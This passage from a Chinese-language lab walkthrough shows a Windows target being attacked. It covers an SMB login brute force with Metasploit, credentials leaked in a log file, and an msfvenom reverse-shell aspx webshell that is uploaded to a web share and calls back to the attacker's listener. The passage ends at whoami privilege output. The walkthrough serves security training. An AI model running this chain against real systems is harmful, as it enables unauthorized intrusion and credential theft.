 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">(</span> Nbtstat Information <span class="token keyword">for</span> <span class="token number">192.168</span>.56.197 <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

Looking up status of <span class="token number">192.168</span>.56.197
        SIMPLE          <span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator"><span class="token file-descriptor important">0</span>></span> -         B <span class="token operator">&lt;</span>ACTIVE<span class="token operator">></span>  Workstation Service
        WORKGROUP       <span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator"><span class="token file-descriptor important">0</span>></span> - <span class="token operator">&lt;</span>GROUP<span class="token operator">></span> B <span class="token operator">&lt;</span>ACTIVE<span class="token operator">></span>  Domain/Workgroup Name
        SIMPLE          <span class="token operator">&lt;</span><span class="token number">2</span><span class="token operator"><span class="token file-descriptor important">0</span>></span> -         B <span class="token operator">&lt;</span>ACTIVE<span class="token operator">></span>  File Server Service

        MAC Address <span class="token operator">=</span> 08-00-27-6B-A0-17

 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token punctuation">(</span> Session Check on <span class="token number">192.168</span>.56.197 <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>


<span class="token punctuation">[</span>E<span class="token punctuation">]</span> Server doesn<span class="token string">'t allow session using username '</span>', password <span class="token string">''</span><span class="token builtin class-name">.</span>  Aborting remainder of tests.</code></pre>
<p>尝试用刚才拿到的用户名进行爆破一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">
msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rhost <span class="token number">192.168</span>.56.197
rhost <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.56.197
msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span>  USER_FILE users.txt
USER_FILE <span class="token operator">=</span><span class="token operator">></span> users.txt
msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> USER_AS_PASS <span class="token boolean">true</span>
USER_AS_PASS <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span>
msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.197:445    - <span class="token number">192.168</span>.56.197:445 - Starting SMB login bruteforce
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.197:445    - <span class="token number">192.168</span>.56.197:445 - Failed: <span class="token string">'.\ruy :ruy '</span>,
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> <span class="token number">192.168</span>.56.197:445    - No active DB -- Credential data will not be saved<span class="token operator">!</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.197:445    - <span class="token number">192.168</span>.56.197:445 - Failed: <span class="token string">'.\marcos:marcos'</span>,
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.197:445    - <span class="token number">192.168</span>.56.197:445 - Failed: <span class="token string">'.\lander:lander'</span>,
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.197:445    - <span class="token number">192.168</span>.56.197:445 - Success: <span class="token string">'.\bogo:bogo'</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.197:445    - <span class="token number">192.168</span>.56.197:445 - Failed: <span class="token string">'.\vaiperruy:vaiperruy'</span>,
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.197:445    - <span class="token number">192.168</span>.56.197:445 - Failed: <span class="token string">'.\marcos:marcos'</span>,
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.197:445    - <span class="token number">192.168</span>.56.197:445 - Failed: <span class="token string">'.\lander:lander'</span>,
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.197:445    - <span class="token number">192.168</span>.56.197:445 - Failed: <span class="token string">'.\vaiper:vaiper'</span>,
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.197:445    - Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.197:445    - Bruteforce completed, <span class="token number">1</span> credential was successful.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.197:445    - You can <span class="token function">open</span> an</code></pre>
<p>拿到一组用户名和密码<code>bogo:bogo</code><br>看一下这个用户的共享目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbclient <span class="token parameter variable">-L</span> //192.168.56.197/ <span class="token parameter variable">-U</span> bogo
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>bogo<span class="token punctuation">]</span>:
 
    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Admin remota
    C$              Disk      Recurso predeterminado
    IPC$            IPC       IPC remota
    LOGS            Disk      
    WEB             Disk   </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">smbclient //192.168.56.197/LOGS/ <span class="token parameter variable">-U</span> bogo
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>bogo<span class="token punctuation">]</span>:
Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
 
  <span class="token number">20231008</span>.log               
 
smb: <span class="token punctuation">\</span><span class="token operator">></span> get <span class="token number">20231008</span>.log </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> <span class="token number">20231008</span>.log                                                        
PS C:<span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>WEB
Acceso denegado
At line:1 char:1
+ <span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          <span class="token builtin class-name">:</span> PermissionDenied: <span class="token punctuation">(</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>WEB:String<span class="token punctuation">)</span> <span class="token punctuation">[</span>Get-ChildItem<span class="token punctuation">]</span>, UnauthorizedAccessException
    + FullyQualifiedErrorId <span class="token builtin class-name">:</span> ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
Cannot <span class="token function">find</span> path <span class="token string">'\\127.0.0.1\WEB'</span> because it does not exist.
At line:1 char:1
+ <span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          <span class="token builtin class-name">:</span> ObjectNotFound: <span class="token punctuation">(</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>WEB:String<span class="token punctuation">)</span> <span class="token punctuation">[</span>Get-ChildItem<span class="token punctuation">]</span>, ItemNotFoundException
    + FullyQualifiedErrorId <span class="token builtin class-name">:</span> PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand

PS C:<span class="token punctuation">\</span><span class="token operator">></span> net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>WEB
Se ha completado el comando correctamente.

PS C:<span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>WEB
Acceso denegado
At line:1 char:1
+ <span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          <span class="token builtin class-name">:</span> PermissionDenied: <span class="token punctuation">(</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>WEB:String<span class="token punctuation">)</span> <span class="token punctuation">[</span>Get-ChildItem<span class="token punctuation">]</span>, UnauthorizedAccessException
    + FullyQualifiedErrorId <span class="token builtin class-name">:</span> ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
Cannot <span class="token function">find</span> path <span class="token string">'\\127.0.0.1\WEB'</span> because it does not exist.
At line:1 char:1
+ <span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          <span class="token builtin class-name">:</span> ObjectNotFound: <span class="token punctuation">(</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>WEB:String<span class="token punctuation">)</span> <span class="token punctuation">[</span>Get-ChildItem<span class="token punctuation">]</span>, ItemNotFoundException
    + FullyQualifiedErrorId <span class="token builtin class-name">:</span> PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand

PS C:<span class="token punctuation">\</span><span class="token operator">></span> net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>WEB /user:marcos SuperPassword
Se ha completado el comando correctamente.

PS C:<span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>WEB

    Directorio: <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>WEB

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        <span class="token number">10</span>/8/2023   <span class="token number">9</span>:46 PM                aspnet_client
-a----        <span class="token number">9</span>/26/2023   <span class="token number">6</span>:46 PM            <span class="token number">703</span> iisstart.htm
-a----        <span class="token number">10</span>/8/2023  <span class="token number">10</span>:46 PM            <span class="token number">158</span> test.php</code></pre>
<p>给了一组账号密码<code>marcos:SuperPassword</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbclient <span class="token parameter variable">-L</span> //192.168.56.197/ <span class="token parameter variable">-U</span> marcos
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>marcos<span class="token punctuation">]</span>:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
        LOGS            Disk      
        WEB             Disk      
Reconnecting with SMB1 <span class="token keyword">for</span> workgroup listing.
do_connect: Connection to <span class="token number">192.168</span>.56.197 failed <span class="token punctuation">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="token punctuation">)</span>
Unable to connect with SMB1 -- no workgroup available</code></pre>
<p>看一下这个WEB目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbclient  //192.168.56.197/WEB <span class="token parameter variable">-U</span> marcos
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>marcos<span class="token punctuation">]</span>:
Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                   D        <span class="token number">0</span>  Sun Oct  <span class="token number">8</span> <span class="token number">23</span>:14:24 <span class="token number">2023</span>
  <span class="token punctuation">..</span>                                  D        <span class="token number">0</span>  Sun Oct  <span class="token number">8</span> <span class="token number">23</span>:14:24 <span class="token number">2023</span>
  03-comming-soon                     D        <span class="token number">0</span>  Mon Oct  <span class="token number">9</span> 05:22:15 <span class="token number">2023</span>
  aspnet_client                       D        <span class="token number">0</span>  Mon Oct  <span class="token number">9</span> 03:46:18 <span class="token number">2023</span>
  common-js                           D        <span class="token number">0</span>  Mon Oct  <span class="token number">9</span> 05:14:09 <span class="token number">2023</span>
  fonts                               D        <span class="token number">0</span>  Mon Oct  <span class="token number">9</span> 05:14:09 <span class="token number">2023</span>
  images                              D        <span class="token number">0</span>  Mon Oct  <span class="token number">9</span> 05:14:09 <span class="token number">2023</span>
  index.html                          A     <span class="token number">1481</span>  Mon Oct  <span class="token number">9</span> 05:26:47 <span class="token number">2023</span>

                <span class="token number">12966143</span> blocks of size <span class="token number">4096</span>. <span class="token number">11157093</span> blocks available
smb: <span class="token punctuation">\</span><span class="token operator">></span> 
```bash
<span class="token operator">></span> <span class="token function">cat</span> index.html
<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE HTML<span class="token operator">></span>
<span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span>
<span class="token operator">&lt;</span>head<span class="token operator">></span>
        <span class="token operator">&lt;</span>title<span class="token operator">></span>Simple<span class="token operator">&lt;</span>/title<span class="token operator">></span>
        <span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"X-UA-Compatible"</span> <span class="token assign-left variable">content</span><span class="token operator">=</span><span class="token string">"IE=edge"</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>meta <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"viewport"</span> <span class="token assign-left variable">content</span><span class="token operator">=</span><span class="token string">"width=device-width, initial-scale=1"</span><span class="token operator">></span>
        <span class="token operator">&lt;</span>meta <span class="token assign-left variable">charset</span><span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>


        <span class="token operator">&lt;</span><span class="token operator">!</span>-- Font --<span class="token operator">></span>

        <span class="token operator">&lt;</span>link <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"https://fonts.googleapis.com/css?family=Open+Sans:400,700%7CPoppins:400,500"</span> <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span>


        <span class="token operator">&lt;</span>link <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"common-css/ionicons.css"</span> <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span>


        <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"common-css/jquery.classycountdown.css"</span> /<span class="token operator">></span>

        <span class="token operator">&lt;</span>link <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"03-comming-soon/css/styles.css"</span> <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span>

        <span class="token operator">&lt;</span>link <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"03-comming-soon/css/responsive.css"</span> <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span>

<span class="token operator">&lt;</span>/head<span class="token operator">></span>
<span class="token operator">&lt;</span>body<span class="token operator">></span>

        <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"main-area center-text"</span> <span class="token assign-left variable">style</span><span class="token operator">=</span><span class="token string">"background-image:url(images/countdown-3-1600x900.jpg);"</span><span class="token operator">></span>

                <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"display-table"</span><span class="token operator">></span>
                        <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"display-table-cell"</span><span class="token operator">></span>

                                <span class="token operator">&lt;</span>h1 <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"title font-white"</span><span class="token operator">></span><span class="token operator">&lt;</span>b<span class="token operator">></span>Comming Soon<span class="token operator">&lt;</span>/b<span class="token operator">></span><span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>></span>
                                <span class="token operator">&lt;</span>p <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"desc font-white"</span><span class="token operator">></span>Our website is currently undergoing scheduled maintenance.
                                        Thanks to the work team: <span class="token punctuation">(</span>ruy, marcos, lander, bogo, vaiper<span class="token punctuation">)</span><span class="token operator">&lt;</span>/p<span class="token operator">></span>

                                <span class="token operator">&lt;</span>a <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"notify-btn"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"#"</span><span class="token operator">></span><span class="token operator">&lt;</span>b<span class="token operator">></span>NOTIFY US<span class="token operator">&lt;</span>/b<span class="token operator">></span><span class="token operator">&lt;</span>/a<span class="token operator">></span>

                                <span class="token operator">&lt;</span>ul <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"social-btn font-white"</span><span class="token operator">></span>
                                        <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"#"</span><span class="token operator">></span>Facebook<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
                                        <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"#"</span><span class="token operator">></span>Twitter<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
                                        <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"#"</span><span class="token operator">></span>Google<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
                                        <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"#"</span><span class="token operator">></span>Instagram<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
                                <span class="token operator">&lt;</span>/ul<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>-- social-btn --<span class="token operator">></span>

                        <span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>-- display-table --<span class="token operator">></span>
                <span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>-- display-table-cell --<span class="token operator">></span>
        <span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>-- main-area --<span class="token operator">></span>

<span class="token operator">&lt;</span>/body<span class="token operator">></span>
<span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre>
<p>原来就是web的目录，传个马进去</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> msfvenom <span class="token parameter variable">-p</span> windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.56.104 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4567</span> <span class="token parameter variable">-f</span> aspx <span class="token operator">></span> a.aspx
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: <span class="token number">460</span> bytes
Final size of aspx file: <span class="token number">3390</span> bytes</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">smb: <span class="token punctuation">\</span><span class="token operator">></span> put a.aspx
putting <span class="token function">file</span> a.aspx as <span class="token punctuation">\</span>a.aspx <span class="token punctuation">(</span><span class="token number">1655.2</span> kb/s<span class="token punctuation">)</span> <span class="token punctuation">(</span>average <span class="token number">1655.3</span> kb/s<span class="token punctuation">)</span>
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">dir</span>
  <span class="token builtin class-name">.</span>                                   D        <span class="token number">0</span>  Mon Jul <span class="token number">15</span> <span class="token number">15</span>:58:47 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                  D        <span class="token number">0</span>  Mon Jul <span class="token number">15</span> <span class="token number">15</span>:58:47 <span class="token number">2024</span>
  03-comming-soon                     D        <span class="token number">0</span>  Mon Oct  <span class="token number">9</span> 05:22:15 <span class="token number">2023</span>
  a.aspx                              A     <span class="token number">3390</span>  Mon Jul <span class="token number">15</span> <span class="token number">15</span>:58:47 <span class="token number">2024</span>
  aspnet_client                       D        <span class="token number">0</span>  Mon Oct  <span class="token number">9</span> 03:46:18 <span class="token number">2023</span>
  common-js                           D        <span class="token number">0</span>  Mon Oct  <span class="token number">9</span> 05:14:09 <span class="token number">2023</span>
  fonts                               D        <span class="token number">0</span>  Mon Oct  <span class="token number">9</span> 05:14:09 <span class="token number">2023</span>
  images                              D        <span class="token number">0</span>  Mon Oct  <span class="token number">9</span> 05:14:09 <span class="token number">2023</span>
  index.html                          A     <span class="token number">1481</span>  Mon Oct  <span class="token number">9</span> 05:26:47 <span class="token number">2023</span>

                <span class="token number">12966143</span> blocks of size <span class="token number">4096</span>. <span class="token number">11156908</span> blocks available</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>       
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.197<span class="token punctuation">]</span> <span class="token number">49670</span>
Microsoft Windows <span class="token punctuation">[</span>Versi�n <span class="token number">10.0</span>.17763.107<span class="token punctuation">]</span>
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2018</span> Microsoft Corporation. Todos los derechos reservados.

c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>inetsrv<span class="token operator">></span>whoami /all
<span class="token function">whoami</span> /all

INFORMACI�N DE USUARIO
----------------------

Nombre de usuario          SID                                                          
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
iis apppool<span class="token punctuation">\</span>defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


INFORMACI�N DE GRUPO
--------------------

Nombre de grupo                             Tipo               SID          Atributos                                                               
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
Etiqueta obligatoria<span class="token punctuation">\</span>Nivel obligatorio alto Etiqueta           S-1-16-12288                                                                         
Todos                                       Grupo conocido     S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN<span class="token punctuation">\</span>Usuarios                            Alias              S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY<span class="token punctuation">\</span>SERVICIO                       Grupo conocido     S-1-5-6      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
INICIO DE SESI�N EN LA CONSOLA              Grupo conocido     S-1-2-1      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY<span class="token punctuation">\</span>Usuarios autentificados        Grupo conocido     S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY<span class="token punctuation">\</span>Esta compa��a                  Grupo conocido     S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN<span class="token punctuation">\</span>IIS_IUSRS                           Alias              S-1-5-32-568 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
LOCAL                                       Grupo conocido     S-1-2-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
                                            Tipo SID no v�lido S-1-5-82-0   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado


INFORMACI�N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci�n                                       Estado       
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
SeAssignPrimaryTokenPrivilege Reemplazar un s�mbolo <span class="token punctuation">(</span>token<span class="token punctuation">)</span> de nivel de proceso Deshabilitado
